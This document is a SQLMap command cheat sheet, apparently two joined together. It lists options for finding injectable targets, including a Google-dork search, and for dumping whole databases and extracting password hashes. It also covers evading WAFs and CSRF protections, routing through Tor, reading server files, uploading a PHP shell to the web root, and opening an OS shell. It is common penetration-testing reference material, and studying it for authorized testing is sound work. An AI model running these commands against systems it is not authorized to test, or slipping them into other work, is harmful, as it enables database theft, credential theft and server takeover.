# SQLMap Command Cheat Sheet

## Basic Usage
```bash
# Basic URL testing
sqlmap -u "http://example.com/page.php?id=1"

# With batch mode (no user interaction)
sqlmap -u "http://example.com/page.php?id=1" --batch
```

## Installation
```bash
# Install via apt (Debian/Ubuntu)
sudo apt install sqlmap

# Manual installation via git
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Run SQLMap
python sqlmap.py
```

## Help Options
```bash
# Basic help
sqlmap -h

# Advanced help (all options)
sqlmap -hh
```

## Target Specification
```bash
# URL with GET parameters
sqlmap -u "http://example.com/vuln.php?id=1"

# POST data
sqlmap -u "http://example.com/" --data "uid=1&name=test"

# Specify parameter to test with asterisk
sqlmap -u "http://example.com/" --data "uid=1*&name=test"

# Use request file (from Burp, etc.)
sqlmap -r req.txt

# Google dork
sqlmap -g "inurl:php?id="
```

## Request Customization
```bash
# Custom cookie
sqlmap -u "url" --cookie="PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c"

# Custom headers
sqlmap -u "url" -H "Cookie: PHPSESSID=abc123"
sqlmap -u "url" -H "User-Agent: Custom Agent"

# Random user agent
sqlmap -u "url" --random-agent

# Mobile user agent
sqlmap -u "url" --mobile

# Custom HTTP method
sqlmap -u "url" --data="id=1" --method PUT

# Specify specific parameter to test
sqlmap -u "url" -p "id"
```

## Techniques and Tuning
```bash
# Specify techniques (B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline)
sqlmap -u "url" --technique=BEUSTQ
sqlmap -u "url" --technique=BEU  # Skip time-based and stacked

# Level and risk (1-5 for level, 1-3 for risk)
sqlmap -u "url" --level=5 --risk=3

# Custom prefix/suffix
sqlmap -u "url" --prefix="%'))" --suffix="-- -"
```

## UNION-specific Options
```bash
# Specify number of columns
sqlmap -u "url" --union-cols=17

# Custom UNION character
sqlmap -u "url" --union-char="a"

# UNION FROM clause
sqlmap -u "url" --union-from=users
```

## Detection Tuning
```bash
# Status code based detection
sqlmap -u "url" --code=200

# Title based detection
sqlmap -u "url" --titles

# String based detection
sqlmap -u "url" --string="success"

# Text-only comparison
sqlmap -u "url" --text-only
```

## Debugging and Analysis
```bash
# Parse and display errors
sqlmap -u "url" --parse-errors

# Store traffic to file
sqlmap -u "url" -t /tmp/traffic.txt

# Verbose output (levels 0-6)
sqlmap -u "url" -v 3
sqlmap -u "url" -v 6  # Maximum verbosity

# Use proxy (for Burp, etc.)
sqlmap -u "url" --proxy="http://127.0.0.1:8080"
```

## Advanced Features
```bash
# Crawl website
sqlmap -u "url" --crawl=2

# Test forms
sqlmap -u "url" --forms

# Skip URL encoding
sqlmap -u "url" --skip-urlencode

# Test headers for injection
sqlmap -u "url" --headers

# Custom injection mark
sqlmap -u "url" --cookie="id=1*"
```

## Output and Sessions
```bash
# Session file location (automatic)
# Stored in: ~/.sqlmap/output/[target]/

# Continue previous session
# SQLMap automatically resumes previous sessions
```

# SQLMap Commands Cheatsheet

## Basic Database Enumeration
```bash
# Basic information gathering
sqlmap -u "URL" --banner --current-user --current-db --is-dba

# Check if current user has DBA privileges
sqlmap -u "URL" --is-dba
```

## Table and Data Enumeration
```bash
# List tables in a specific database
sqlmap -u "URL" --tables -D database_name

# Dump specific table
sqlmap -u "URL" --dump -T table_name -D database_name

# Dump specific columns
sqlmap -u "URL" --dump -T table_name -D database_name -C column1,column2

# Dump specific rows (by range)
sqlmap -u "URL" --dump -T table_name -D database_name --start=2 --stop=5

# Conditional data dump
sqlmap -u "URL" --dump -T table_name -D database_name --where="condition"

# Dump entire database
sqlmap -u "URL" --dump -D database_name

# Dump all databases (excluding system databases)
sqlmap -u "URL" --dump-all --exclude-sysdbs
```

## Schema and Search Operations
```bash
# Get database schema
sqlmap -u "URL" --schema

# Search for tables containing keyword
sqlmap -u "URL" --search -T keyword

# Search for columns containing keyword
sqlmap -u "URL" --search -C keyword
```

## Password Enumeration
```bash
# Extract database user passwords
sqlmap -u "URL" --passwords --batch
```

## Protection Bypasses
```bash
# Anti-CSRF token bypass
sqlmap -u "URL" --data="id=1&csrf-token=value" --csrf-token="csrf-token"

# Randomize parameter values
sqlmap -u "URL" --randomize=parameter_name

# Calculated parameter bypass
sqlmap -u "URL" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"

# Use proxy
sqlmap -u "URL" --proxy="socks4://proxy_ip:port"

# Use Tor network
sqlmap -u "URL" --tor --check-tor

# Random user agent
sqlmap -u "URL" --random-agent

# Skip WAF detection
sqlmap -u "URL" --skip-waf

# Use tamper scripts
sqlmap -u "URL" --tamper=between,randomcase

# List available tamper scripts
sqlmap --list-tampers

# Chunked transfer encoding
sqlmap -u "URL" --chunked
```

## File Operations
```bash
# Read local files
sqlmap -u "URL" --file-read="/path/to/file"

# Write files to server
sqlmap -u "URL" --file-write="local_file.php" --file-dest="/var/www/html/shell.php"
```

## OS Exploitation
```bash
# Get OS shell
sqlmap -u "URL" --os-shell

# Get OS shell with specific technique
sqlmap -u "URL" --os-shell --technique=E
```

## General Options
```bash
# Batch mode (automatic answers)
sqlmap -u "URL" --batch

# Verbose output
sqlmap -u "URL" -v 5

# Specify output format
sqlmap -u "URL" --dump-format=HTML

# Specify technique
sqlmap -u "URL" --technique=UNION

# All-in-one enumeration
sqlmap -u "URL" --all --batch --exclude-sysdbs
```

## POST Data Examples
```bash
# POST request with data
sqlmap -u "URL" --data="id=1&name=test"

# POST with cookies
sqlmap -u "URL" --data="id=1" --cookie="session=value"
```
